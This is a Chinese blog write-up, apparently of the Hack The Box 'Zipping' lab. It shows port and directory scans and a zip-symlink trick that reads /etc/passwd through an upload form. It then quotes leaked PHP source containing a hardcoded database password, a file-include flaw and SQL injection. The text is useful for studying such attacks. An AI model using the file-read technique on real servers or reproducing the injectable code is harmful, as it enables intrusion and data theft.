<!-- build time:Sat Jun 01 2024 13:53:53 GMT+0800 (中国标准时间) --><!DOCTYPE html><html lang="zh-CN"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=2"><meta name="theme-color" content="#FFF"><link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png"><link rel="icon" type="image/ico" sizes="32x32" href="/images/favicon.ico"><meta http-equiv="Cache-Control" content="no-transform"><meta http-equiv="Cache-Control" content="no-siteapp"><link rel="alternate" type="application/rss+xml" title="ililiiY" href="https://lookhui.github.io/rss.xml"><link rel="alternate" type="application/atom+xml" title="ililiiY" href="https://lookhui.github.io/atom.xml"><link rel="alternate" type="application/json" title="ililiiY" href="https://lookhui.github.io/feed.json"><link rel="stylesheet" href="//fonts.googleapis.com/css?family=Mulish:300,300italic,400,400italic,700,700italic%7CFredericka%20the%20Great:300,300italic,400,400italic,700,700italic%7CNoto%20Serif%20JP:300,300italic,400,400italic,700,700italic%7CNoto%20Serif%20SC:300,300italic,400,400italic,700,700italic%7CInconsolata:300,300italic,400,400italic,700,700italic&display=swap&subset=latin,latin-ext"><link rel="stylesheet" href="/css/app.css?v=0.2.5"><meta name="keywords" content="渗透"><link rel="canonical" href="https://lookhui.github.io/HTB-Zipping/"><title>HTB-Zipping - HTB | look-hui = ililiiY = lookhui</title><meta name="generator" content="Hexo 7.2.0"></head><body itemscope itemtype="http://schema.org/WebPage"><div id="loading"><div class="cat"><div class="body"></div><div class="head"><div class="face"></div></div><div class="foot"><div class="tummy-end"></div><div class="bottom"></div><div class="legs left"></div><div class="legs right"></div></div><div class="paw"><div class="hands left"></div><div class="hands right"></div></div></div></div><div id="container"><header id="header" itemscope itemtype="http://schema.org/WPHeader"><div class="inner"><div id="brand"><div class="pjax"><h1 itemprop="name headline">HTB-Zipping</h1><div class="meta"><span class="item" title="创建时间：2023-12-15 11:29:22"><span class="icon"><i class="ic i-calendar"></i> </span><span class="text">发表于</span> <time itemprop="dateCreated datePublished" datetime="2023-12-15T11:29:22+08:00">2023-12-15</time></span></div></div></div><nav id="nav"><div class="inner"><div class="toggle"><div class="lines" aria-label="切换导航栏"><span class="line"></span> <span class="line"></span> <span class="line"></span></div></div><ul class="menu"><li class="item title"><a href="/" rel="start">look-hui</a></li></ul><ul class="right"><li class="item theme"><i class="ic i-sun"></i></li><li class="item search"><i class="ic i-search"></i></li></ul></div></nav></div><div id="imgs" class="pjax"><ul><li class="item" data-background-image="https://www.loliapi.com/acg/?90912"></li><li class="item" data-background-image="https://www.loliapi.com/acg/?652217"></li><li class="item" data-background-image="https://www.loliapi.com/acg/?818804"></li><li class="item" data-background-image="https://www.loliapi.com/acg/?472441"></li><li class="item" data-background-image="https://www.loliapi.com/acg/?132190"></li><li class="item" data-background-image="https://www.loliapi.com/acg/?592336"></li></ul></div></header><div id="waves"><svg class="waves" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 24 150 28" preserveAspectRatio="none" shape-rendering="auto"><defs><path id="gentle-wave" d="M-160 44c30 0 58-18 88-18s 58 18 88 18 58-18 88-18 58 18 88 18 v44h-352z"/></defs><g class="parallax"><use xlink:href="#gentle-wave" x="48" y="0"/><use xlink:href="#gentle-wave" x="48" y="3"/><use xlink:href="#gentle-wave" x="48" y="5"/><use xlink:href="#gentle-wave" x="48" y="7"/></g></svg></div><main><div class="inner"><div id="main" class="pjax"><div class="article wrap"><div class="breadcrumb" itemscope itemtype="https://schema.org/BreadcrumbList"><i class="ic i-home"></i> <span><a href="/">首页</a></span><i class="ic i-angle-right"></i> <span class="current" itemprop="itemListElement" itemscope itemtype="https://schema.org/ListItem"><a href="/categories/HTB/" itemprop="item" rel="index" title="分类于 HTB"><span itemprop="name">HTB</span></a><meta itemprop="position" content="1"></span></div><article itemscope itemtype="http://schema.org/Article" class="post block" lang="zh-CN"><link itemprop="mainEntityOfPage" href="https://lookhui.github.io/HTB-Zipping/"><span hidden itemprop="author" itemscope itemtype="http://schema.org/Person"><meta itemprop="image" content="/images/avatar.jpg"><meta itemprop="name" content="c0iq"><meta itemprop="description" content="lookhui, 坚持与努力"></span><span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization"><meta itemprop="name" content="ililiiY"></span><div class="body md" itemprop="articleBody"><h1 id="zipping"><a class="anchor" href="#zipping">#</a> Zipping</h1><h4 id="信息收集"><a class="anchor" href="#信息收集">#</a> 信息收集</h4><p>开启靶机后得到靶机 ip</p><p></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">靶机:10.129.48.105</span><br><span class="line">自己:10.10.14.22</span><br></pre></td></tr></table></figure><p></p><p>首先使用 nmap 来进行扫描</p><p>同时使用浏览器默认访问</p><p>发现和常规的不同不需要使用域名也就是不需要更换 hosts</p><p>使用 f12 打开检查点击 network 查看响应器 (目的是查看是否有可利用的 api)</p><p>发现并没有我们想要的</p><p>使用 wfuzz 进行模糊测试查看目录</p><p>同时 nmap 扫描信息出来</p><p></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Starting Nmap 7.93 ( https://nmap.org ) at 2023-12-15 11:31 中国标准时间</span><br><span class="line">Nmap scan report for bogon (10.129.48.105)</span><br><span class="line">Host is up (0.32s latency).</span><br><span class="line">Not shown: 998 closed tcp ports (reset)</span><br><span class="line">PORT   STATE SERVICE</span><br><span class="line">22/tcp open  ssh</span><br><span class="line">80/tcp open  http</span><br><span class="line"></span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 6.04 seconds</span><br></pre></td></tr></table></figure><p></p><p>根据我的扫描得到的目录有</p><p></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">Target: http://10.129.48.105/FUZZ</span><br><span class="line">Total requests: 45524</span><br><span class="line"></span><br><span class="line">=====================================================================</span><br><span class="line">ID           Response   Lines    Word       Chars       Payload</span><br><span class="line">=====================================================================</span><br><span class="line"></span><br><span class="line">000000006:   200        317 L    1354 W     16736 Ch    &quot;index.php&quot;</span><br><span class="line">000000082:   301        9 L      28 W       315 Ch      &quot;assets&quot;</span><br><span class="line">000000290:   301        9 L      28 W       316 Ch      &quot;uploads&quot;</span><br><span class="line">000000291:   200        113 L    380 W      5322 Ch     &quot;upload.php&quot;</span><br><span class="line">000000925:   403        9 L      28 W       278 Ch      &quot;.htpasswd&quot;</span><br><span class="line">000001526:   301        9 L      28 W       313 Ch      &quot;shop&quot;</span><br><span class="line">000013450:   403        9 L      28 W       278 Ch      &quot;.htaccess&quot;</span><br></pre></td></tr></table></figure><p></p><p>先去访问这个 upload.php</p><p>发现我们上传一般的木马上传不上去，文件名格式必须是压缩包的，并且压缩包内还必须包含.pdf 文件</p><p>经过尝试这个题可以使用 zip 符号链接来达到任意读取</p><p>参考链接 (2023 年大学生信息安全竞赛 unzip)</p><p></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://ctf.njupt.edu.cn/archives/898</span><br></pre></td></tr></table></figure><p></p><p></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ln -s ../../../../../etc/passwd pass</span><br><span class="line">然后将这个pass加上后缀.pdf</span><br><span class="line">在通过</span><br><span class="line">zip --symlinks pass.zip pass.pdf</span><br><span class="line">进行解压</span><br></pre></td></tr></table></figure><p></p><p>完成后进入</p><p></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://10.129.48.105/upload.php</span><br></pre></td></tr></table></figure><p></p><p>上传成功后点击链接查看</p><p>我使用的火狐能够查看，使用 edge 或者谷歌都会报错</p><p>那我们现在开始任意读取了</p><p>经过读取发现</p><p>/shop/index.php</p><p></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">session_start();</span><br><span class="line">// Include functions and connect to the database using PDO MySQL</span><br><span class="line">include &#x27;functions.php&#x27;;</span><br><span class="line">$pdo = pdo_connect_mysql();</span><br><span class="line">// Page is set to home (home.php) by default, so when the visitor visits, that will be the page they see.</span><br><span class="line">$page = isset($_GET[&#x27;page&#x27;]) &amp;&amp; file_exists($_GET[&#x27;page&#x27;] . &#x27;.php&#x27;) ? $_GET[&#x27;page&#x27;] : &#x27;home&#x27;;</span><br><span class="line">// Include and show the requested page</span><br><span class="line">include $page . &#x27;.php&#x27;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p></p><p>functions.php</p><p></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">function pdo_connect_mysql() &#123;</span><br><span class="line">    // Update the details below with your MySQL details</span><br><span class="line">    $DATABASE_HOST = &#x27;localhost&#x27;;</span><br><span class="line">    $DATABASE_USER = &#x27;root&#x27;;</span><br><span class="line">    $DATABASE_PASS = &#x27;MySQL_P@ssw0rd!&#x27;;</span><br><span class="line">    $DATABASE_NAME = &#x27;zipping&#x27;;</span><br><span class="line">    try &#123;</span><br><span class="line">    	return new PDO(&#x27;mysql:host=&#x27; . $DATABASE_HOST . &#x27;;dbname=&#x27; . $DATABASE_NAME . &#x27;;charset=utf8&#x27;, $DATABASE_USER, $DATABASE_PASS);</span><br><span class="line">    &#125; catch (PDOException $exception) &#123;</span><br><span class="line">    	// If there is an error with the connection, stop the script and display the error.</span><br><span class="line">    	exit(&#x27;Failed to connect to database!&#x27;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">// Template header, feel free to customize this</span><br><span class="line">function template_header($title) &#123;</span><br><span class="line">$num_items_in_cart = isset($_SESSION[&#x27;cart&#x27;]) ? count($_SESSION[&#x27;cart&#x27;]) : 0;</span><br><span class="line">echo &lt;&lt;&lt;EOT</span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">	&lt;head&gt;</span><br><span class="line">		&lt;meta charset=&quot;utf-8&quot;&gt;</span><br><span class="line">		&lt;title&gt;$title&lt;/title&gt;</span><br><span class="line">		&lt;link href=&quot;assets/style.css&quot; rel=&quot;stylesheet&quot; type=&quot;text/css&quot;&gt;</span><br><span class="line">		&lt;link rel=&quot;stylesheet&quot; href=&quot;https://use.fontawesome.com/releases/v5.7.1/css/all.css&quot;&gt;</span><br><span class="line">	&lt;/head&gt;</span><br><span class="line">	&lt;body&gt;</span><br><span class="line">        &lt;header&gt;</span><br><span class="line">            &lt;div class=&quot;content-wrapper&quot;&gt;</span><br><span class="line">                &lt;a href=&quot;..&quot; style=&quot;text-decoration: none;&quot;&gt;&lt;h1&gt;Zipping Watch Store&lt;/h1&gt;&lt;/a&gt;</span><br><span class="line">                &lt;nav&gt;</span><br><span class="line">                    &lt;a href=&quot;index.php&quot;&gt;Home&lt;/a&gt;</span><br><span class="line">                    &lt;a href=&quot;index.php?page=products&quot;&gt;Products&lt;/a&gt;</span><br><span class="line">                &lt;/nav&gt;</span><br><span class="line">                &lt;div class=&quot;link-icons&quot;&gt;</span><br><span class="line">                    &lt;a href=&quot;index.php?page=cart&quot;&gt;</span><br><span class="line">						&lt;i class=&quot;fas fa-shopping-cart&quot;&gt;&lt;/i&gt;</span><br><span class="line">						&lt;span&gt;$num_items_in_cart&lt;/span&gt;</span><br><span class="line">					&lt;/a&gt;</span><br><span class="line">                &lt;/div&gt;</span><br><span class="line">            &lt;/div&gt;</span><br><span class="line">        &lt;/header&gt;</span><br><span class="line">        &lt;main&gt;</span><br><span class="line">EOT;</span><br><span class="line">&#125;</span><br><span class="line">// Template footer</span><br><span class="line">function template_footer() &#123;</span><br><span class="line">$year = date(&#x27;Y&#x27;);</span><br><span class="line">echo &lt;&lt;&lt;EOT</span><br><span class="line">        &lt;/main&gt;</span><br><span class="line">        &lt;footer&gt;</span><br><span class="line">            &lt;div class=&quot;content-wrapper&quot;&gt;</span><br><span class="line">                &lt;p&gt;&amp;copy; $year, Zipping Watch Store&lt;/p&gt;</span><br><span class="line">            &lt;/div&gt;</span><br><span class="line">        &lt;/footer&gt;</span><br><span class="line">    &lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line">EOT;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p></p><p>在这里得到了数据库的用户和密码</p><p>product.php</p><p></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">// Check to make sure the id parameter is specified in the URL</span><br><span class="line">if (isset($_GET[&#x27;id&#x27;])) &#123;</span><br><span class="line">    $id = $_GET[&#x27;id&#x27;];</span><br><span class="line">    // Filtering user input for letters or special characters</span><br><span class="line">    if(preg_match(&quot;/^.*[A-Za-z!#$%^&amp;*()\-_=+&#123;&#125;\[\]\\|;:&#x27;\&quot;,.&lt;&gt;\/?]|[^0-9]$/&quot;, $id, $match)) &#123;</span><br><span class="line">        header(&#x27;Location: index.php&#x27;);</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        // Prepare statement and execute, but does not prevent SQL injection</span><br><span class="line">        $stmt = $pdo-&gt;prepare(&quot;SELECT * FROM products WHERE id = &#x27;$id&#x27;&quot;);</span><br><span class="line">        $stmt-&gt;execute();</span><br><span class="line">        // Fetch the product from the database and return the result as an Array</span><br><span class="line">        $product = $stmt-&gt;fetch(PDO::FETCH_ASSOC);</span><br><span class="line">        // Check if the product exists (array is not empty)</span><br><span class="line">        if (!$product) &#123;</span><br><span class="line">            // Simple error to display if the id for the product doesn&#x27;t exists (array is empty)</span><br><span class="line">            exit(&#x27;Product does not exist!&#x27;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; else &#123;</span><br><span class="line">    // Simple error to display if the id wasn&#x27;t specified</span><br><span class="line">    exit(&#x27;No ID provided!&#x27;);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">&lt;?=template_header(&#x27;Zipping | Product&#x27;)?&gt;</span><br><span class="line"></span><br><span class="line">&lt;div class=&quot;product content-wrapper&quot;&gt;</span><br><span class="line">    &lt;img src=&quot;assets/imgs/&lt;?=$product[&#x27;img&#x27;]?&gt;&quot; width=&quot;500&quot; height=&quot;500&quot; alt=&quot;&lt;?=$product[&#x27;name&#x27;]?&gt;&quot;&gt;</span><br><span class="line">    &lt;div&gt;</span><br><span class="line">        &lt;h1 class=&quot;name&quot;&gt;&lt;?=$product[&#x27;name&#x27;]?&gt;&lt;/h1&gt;</span><br><span class="line">        &lt;span class=&quot;price&quot;&gt;</span><br><span class="line">            &amp;dollar;&lt;?=$product[&#x27;price&#x27;]?&gt;</span><br><span class="line">            &lt;?php if ($product[&#x27;rrp&#x27;] &gt; 0): ?&gt;</span><br><span class="line">            &lt;span class=&quot;rrp&quot;&gt;&amp;dollar;&lt;?=$product[&#x27;rrp&#x27;]?&gt;&lt;/span&gt;</span><br><span class="line">            &lt;?php endif; ?&gt;</span><br><span class="line">        &lt;/span&gt;</span><br><span class="line">        &lt;form action=&quot;index.php?page=cart&quot; method=&quot;post&quot;&gt;</span><br><span class="line">            &lt;input type=&quot;number&quot; name=&quot;quantity&quot; value=&quot;1&quot; min=&quot;1&quot; max=&quot;&lt;?=$product[&#x27;quantity&#x27;]?&gt;&quot; placeholder=&quot;Quantity&quot; required&gt;</span><br><span class="line">            &lt;input type=&quot;hidden&quot; name=&quot;product_id&quot; value=&quot;&lt;?=$product[&#x27;id&#x27;]?&gt;&quot;&gt;</span><br><span class="line">            &lt;input type=&quot;submit&quot; value=&quot;Add To Cart&quot;&gt;</span><br><span class="line">        &lt;/form&gt;</span><br><span class="line">        &lt;div class=&quot;description&quot;&gt;</span><br><span class="line">            &lt;?=$product[&#x27;desc&#x27;]?&gt;</span><br><span class="line">        &lt;/div&gt;</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line"></span><br><span class="line">&lt;?=template_footer()?&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p></p><p>cart.php</p><p></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">// If the user clicked the add to cart button on the product page we can check for the form data</span><br><span class="line">if (isset($_POST[&#x27;product_id&#x27;], $_POST[&#x27;quantity&#x27;])) &#123;</span><br><span class="line">    // Set the post variables so we easily identify them, also make sure they are integer</span><br><span class="line">    $product_id = $_POST[&#x27;product_id&#x27;];</span><br><span class="line">    $quantity = $_POST[&#x27;quantity&#x27;];</span><br><span class="line">    // Filtering user input for letters or special characters</span><br><span class="line">    if(preg_match(&quot;/^.*[A-Za-z!#$%^&amp;*()\-_=+&#123;&#125;\[\]\\|;:&#x27;\&quot;,.&lt;&gt;\/?]|[^0-9]$/&quot;, $product_id, $match) || preg_match(&quot;/^.*[A-Za-z!#$%^&amp;*()\-_=+&#123;&#125;[\]\\|;:&#x27;\&quot;,.&lt;&gt;\/?]/i&quot;, $quantity, $match)) &#123;</span><br><span class="line">        echo &#x27;&#x27;;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        // Construct the SQL statement with a vulnerable parameter</span><br><span class="line">        $sql = &quot;SELECT * FROM products WHERE id = &#x27;&quot; . $_POST[&#x27;product_id&#x27;] . &quot;&#x27;&quot;;</span><br><span class="line">        // Execute the SQL statement without any sanitization or parameter binding</span><br><span class="line">        $product = $pdo-&gt;query($sql)-&gt;fetch(PDO::FETCH_ASSOC);</span><br><span class="line">        // Check if the product exists (array is not empty)</span><br><span class="line">        if ($product &amp;&amp; $quantity &gt; 0) &#123;</span><br><span class="line">            // Product exists in database, now we can create/update the session variable for the cart</span><br><span class="line">            if (isset($_SESSION[&#x27;cart&#x27;]) &amp;&amp; is_array($_SESSION[&#x27;cart&#x27;])) &#123;</span><br><span class="line">                if (array_key_exists($product_id, $_SESSION[&#x27;cart&#x27;])) &#123;</span><br><span class="line">                    // Product exists in cart so just update the quanity</span><br><span class="line">                    $_SESSION[&#x27;cart&#x27;][$product_id] += $quantity;</span><br><span class="line">                &#125; else &#123;</span><br><span class="line">                    // Product is not in cart so add it</span><br><span class="line">                    $_SESSION[&#x27;cart&#x27;][$product_id] = $quantity;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; else &#123;</span><br><span class="line">                // There are no products in cart, this will add the first product to cart</span><br><span class="line">                $_SESSION[&#x27;cart&#x27;] = array($product_id =&gt; $quantity);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        // Prevent form resubmission...</span><br><span class="line">        header(&#x27;location: index.php?page=cart&#x27;);</span><br><span class="line">        exit;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// Remove product from cart, check for the URL param &quot;remove&quot;, this is the product id, make sure it&#x27;s a number and check if it&#x27;s in the cart</span><br><span class="line">if (isset($_GET[&#x27;remove&#x27;]) &amp;&amp; is_numeric($_GET[&#x27;remove&#x27;]) &amp;&amp; isset($_SESSION[&#x27;cart&#x27;]) &amp;&amp; isset($_SESSION[&#x27;cart&#x27;][$_GET[&#x27;remove&#x27;]])) &#123;</span><br><span class="line"></span><br><span class="line">    // Remove the product from the shopping cart</span><br><span class="line">    unset($_SESSION[&#x27;cart&#x27;][$_GET[&#x27;remove&#x27;]]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// Update product quantities in cart if the user clicks the &quot;Update&quot; button on the shopping cart page</span><br><span class="line">if (isset($_POST[&#x27;update&#x27;]) &amp;&amp; isset($_SESSION[&#x27;cart&#x27;])) &#123;</span><br><span class="line">    // Loop through the post data so we can update the quantities for every product in cart</span><br><span class="line">    foreach ($_POST as $k =&gt; $v) &#123;</span><br><span class="line">        if (strpos($k, &#x27;quantity&#x27;) !== false &amp;&amp; is_numeric($v)) &#123;</span><br><span class="line">            $id = str_replace(&#x27;quantity-&#x27;, &#x27;&#x27;, $k);</span><br><span class="line">            $quantity = (int)$v;</span><br><span class="line">            // Always do checks and validation</span><br><span class="line">            if (is_numeric($id) &amp;&amp; isset($_SESSION[&#x27;cart&#x27;][$id]) &amp;&amp; $quantity &gt; 0) &#123;</span><br><span class="line">                // Update new quantity</span><br><span class="line">                $_SESSION[&#x27;cart&#x27;][$id] = $quantity;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    // Prevent form resubmission...</span><br><span class="line">    header(&#x27;location: index.php?page=cart&#x27;);</span><br><span class="line">    exit;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// Send the user to the place order page if they click the Place Order button, also the cart should not be empty</span><br><span class="line">if (isset($_POST[&#x27;placeorder&#x27;]) &amp;&amp; isset($_SESSION[&#x27;cart&#x27;]) &amp;&amp; !empty($_SESSION[&#x27;cart&#x27;])) &#123;</span><br><span class="line">    header(&#x27;Location: index.php?page=placeorder&#x27;);</span><br><span class="line">    exit;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if (isset($_POST[&#x27;clear&#x27;])) &#123;</span><br><span class="line">	unset($_SESSION[&#x27;cart&#x27;]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// Check the session variable for products in cart</span><br><span class="line">$products_in_cart = isset($_SESSION[&#x27;cart&#x27;]) ? $_SESSION[&#x27;cart&#x27;] : array();</span><br><span class="line">$products = array();</span><br><span class="line">$subtotal = 0.00;</span><br><span class="line">// If there are products in cart</span><br><span class="line">if ($products_in_cart) &#123;</span><br><span class="line">    // There are products in the cart so we need to select those products from the database</span><br><span class="line">    // Products in cart array to question mark string array, we need the SQL statement to include IN (?,?,?,...etc)</span><br><span class="line">    $array_to_question_marks = implode(&#x27;,&#x27;, array_fill(0, count($products_in_cart), &#x27;?&#x27;));</span><br><span class="line">    $stmt = $pdo-&gt;prepare(&#x27;SELECT * FROM products WHERE id IN (&#x27; . $array_to_question_marks . &#x27;)&#x27;);</span><br><span class="line">    // We only need the array keys, not the values, the keys are the id&#x27;s of the products</span><br><span class="line">    $stmt-&gt;execute(array_keys($products_in_cart));</span><br><span class="line">    // Fetch the products from the database and return the result as an Array</span><br><span class="line">    $products = $stmt-&gt;fetchAll(PDO::FETCH_ASSOC);</span><br><span class="line">    // Calculate the subtotal</span><br><span class="line">    foreach ($products as $product) &#123;</span><br><span class="line">        $subtotal += (float)$product[&#x27;price&#x27;] * (int)$products_in_cart[$product[&#x27;id&#x27;]];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">&lt;?=template_header(&#x27;Zipping | Cart&#x27;)?&gt;</span><br><span class="line"></span><br><span class="line">&lt;div class=&quot;cart content-wrapper&quot;&gt;</span><br><span class="line">    &lt;h1&gt;Shopping Cart&lt;/h1&gt;</span><br><span class="line">    &lt;form action=&quot;index.php?page=cart&quot; method=&quot;post&quot;&gt;</span><br><span class="line">        